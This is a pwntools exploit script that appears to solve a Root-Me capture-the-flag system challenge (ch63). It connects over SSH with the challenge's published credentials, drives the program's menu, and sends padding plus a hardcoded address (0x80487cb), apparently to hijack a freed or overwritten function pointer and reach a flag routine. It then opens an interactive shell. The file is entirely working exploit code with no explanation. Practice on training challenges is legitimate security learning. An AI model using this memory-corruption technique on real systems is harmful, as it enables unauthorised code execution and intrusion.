from pwn import *

context.update(arch='i386', os='linux')
r = ssh(user="app-systeme-ch63", host="challenge03.root-me.org", port=2223, password="app-systeme-ch63")
p = r.process(executable="/challenge/app-systeme/ch63/ch63",
              cwd="/challenge/app-systeme/ch63", env={})

flagaddr = 0x80487cb

print(p.recvuntil('0: Quit').decode('utf-8'))
p.sendline('1')


print(p.recvuntil('him?').decode('utf-8'))
p.sendline('AAAAAAAAAAAA')

print(p.recvuntil('0: Quit').decode('utf-8'))
p.sendline('2')

print(p.recvuntil('0: Quit').decode('utf-8'))
p.sendline('4')

print(p.recvuntil('0: Quit'))
p.sendline('5')

payload = ''
payload += 'B'*12
payload = payload.encode() + p32(flagaddr)

print(p.recvuntil('build it?').decode('utf-8'))
p.sendline(payload)

print(p.recvuntil('name it?').decode('utf-8'))
p.sendline("CCCCCCCC")

print(p.recvuntil('0: Quit').decode('utf-8'))
p.sendline('7')

print(p.recvuntil('0: Quit').decode('utf-8'))
p.sendline('3')

print(p.recv(2048))

p.interactive()
